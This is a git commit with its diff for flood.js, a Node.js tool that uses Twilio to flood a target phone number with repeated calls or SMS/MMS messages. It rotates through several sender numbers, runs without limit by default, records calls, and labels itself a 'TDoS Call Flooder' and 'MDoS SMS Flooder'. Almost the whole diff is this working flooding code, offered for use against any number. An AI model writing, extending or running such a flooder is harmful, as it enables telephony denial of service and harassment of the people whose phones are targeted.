4764480832ed1670032f5115fe568991405a8525
testerindian385 <57323462+testerindian385@users.noreply.github.com>
2023-03-20 05:09:06 -0500

    i need help with issues, i am getting (#4)
    * Reogranize
    
    * fixed variable name
    
    * Update README.md
    
    * Update README.md
    
    * Multi Number Parse
    
    * Additional Call Logging
    
    * Update README.md
    
    * Update README.md
    
    * use dotenv
    
    * TDoS and MDoS
    
    * messaging -checkpoint-
    
    * fixed bug
    
    * remove console logs
    
    * consolidate code
    
    * colorings
    
    * README
    
    * output format
    
    * remove unneeded .env param
    
    * update readme
    
    * add MMS support
    
    * update readme with MMS examples
    
    * update help message and readme
    
    ---------
    
    Co-authored-by: Ethan Wessel <ejwessel@gmail.com>

--- flood.js
+++ flood.js
@@ -1,58 +1,116 @@
 /*
-Misanya Liu
+Misanya Liui started this code
 7/12/17
-I've stared this code!
+Ethan Wessel continuing for own personal project
+10/24/2017
 */
-let accountSid = '*************';//Config Here
-let authToken = '**************';//Config Here
-let client = require('twilio')(accountSid, authToken);
-let readline = require('readline');
 
-let numbers = ['+10000000000','+10000000000','+10000000000','+10000000000'];//Config Here
-let toNumber = '+86**********';
-let count = 1;
+require('dotenv').config()
+const chalk = require('chalk')
+const { program } = require("commander");
 
-const calltimeout = 3000;// call time out = 3s.
-
-const appName ='===SOUP===';
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-
-let index = 0;
-const callPhone = ()=>{
-    client.calls.create({
-        url: "http://demo.twilio.com/docs/voice.xml",// add your own TwiML file path here.
-        to: toNumber,
-        from: numbers[index++]
-    }, function(err, call) {
-        if(call){
-            console.log(call.sid);
-        }
-        console.log(err);
-    });
-
-    if(index >= numbers.length){
-        index = 0;
-    }
+function commaSeparatedList(value, dummyPrevious) {
+    return value.split(',');
 }
 
-const launchCall = ()=>{
-    callPhone();
-    setInterval(callPhone,calltimeout);
-};
+program
+    .requiredOption('-t, --target <string>', 'target number where messages and media will be delivered')
+    .requiredOption('-a, --action <string>', 'call or sms', 'call')
+    .requiredOption('-n, --numbers <items>', 'numbers to use; comma separated', commaSeparatedList)
+    .option('-i, --instances <string>', 'number of call/sms instances to deliver', 'unlimited')
+    .option('-d, --delay <string>', 'delay between calls/sms in seconds', '10')
+    .option('-m, --message <string>', 'message to send for sms')
+    .option('-l, --imageLink <string>', 'media to send for mms (link)')
+    .parse()
+const options = program.opts()
 
-// Entrance of Main
-console.log(appName);
-rl.question('Enter the target numbe to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
-    console.log(`Trying to call this number: ${answer}`);
-    toNumber = answer;
+if (options.action !== 'call' && options.action !== 'sms') {
+    console.log(chalk.red(`'${options.action}' is an Invalid Action, please select: 'call' or 'sms'`))
+    process.exit(0)
+}
 
-    rl.close();
+const ACTION = options.action
+const MAX_INSTANCE_COUNT = options.instances !== 'unlimited' ? parseInt(options.instances) : 'unlimited'
+const DELAY = parseInt(options.delay) * 1000;
+const MESSAGE = options.message;
+const MEDIA = options.imageLink;
+const TARGET = options.target;
+const NUMBERS = options.numbers;
 
-    launchCall();
-});
+const ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID; //Config Here
+const AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN; //Config Here
+const TWIML_URL = process.env.TWILIO_TWIML; //Config Here
+const MSG_SERVICE_SID = process.env.MSG_SID; //Config Here
 
+let client = require('twilio')(ACCOUNT_SID, AUTH_TOKEN);
 
-   
+let instanceCount = 0;
+let index = 0;
+
+const callPhone = () => {
+    if (typeof (MAX_INSTANCE_COUNT) === 'number' && instanceCount >= MAX_INSTANCE_COUNT) {
+        console.log(`Terminating, max call count reached: ${MAX_INSTANCE_COUNT}`)
+        process.exit(0)
+    }
+    instanceCount += 1
+    client.calls.create({
+        url: TWIML_URL,
+        to: TARGET,
+        from: NUMBERS[index++],
+        record: true
+    }, function (err, call) {
+        if (call) {
+            console.log(`SID: ${call.sid}`);
+            console.log(`Calling ${chalk.yellow(TARGET)} from ${chalk.yellow(NUMBERS[index])}`);
+        } else {
+            console.log(`ERROR: ${err}`);
+        }
+    });
+    // loop through numbers
+    index += 1
+    index %= NUMBERS.length
+}
+const smsPhone = () => {
+    if (typeof (MAX_INSTANCE_COUNT) === 'number' && instanceCount >= MAX_INSTANCE_COUNT) {
+        console.log(`Terminating, max message count reached: ${MAX_INSTANCE_COUNT}`)
+        process.exit(0)
+    }
+
+    const params = {}
+    params.messagingServiceSid = MSG_SERVICE_SID
+    params.to = options.target
+    if (MESSAGE && MEDIA) {
+        params.body = MESSAGE
+        params.mediaUrl = [MEDIA]
+    } else if (MESSAGE) {
+        params.body = MESSAGE
+    }
+    else {
+        params.mediaUrl = [MEDIA]
+    }
+
+    instanceCount += 1
+    client.messages.create(
+        params,
+        function (err, message) {
+            if (message) {
+                console.log(`SID: ${message.sid}`);
+                console.log(`Messaging ${chalk.yellow(TARGET)} from ${chalk.yellow(NUMBERS[index])}`)
+                if (MESSAGE) console.log(`message: ${chalk.green(MESSAGE)}`)
+                if (MEDIA) console.log(`media: ${chalk.green(MEDIA)}`)
+            } else {
+                console.log(`ERROR: ${err} `);
+            }
+        })
+    // loop through numbers
+    index += 1
+    index %= NUMBERS.length
+}
+
+const launch = () => {
+    const action = (ACTION === 'call') ? callPhone : smsPhone;
+    const output = (ACTION === 'call') ? '===TDoS Call Flooder===' : '===MDoS SMS Flooder==='
+    console.log(output)
+    setInterval(action, DELAY);
+}
+launch()
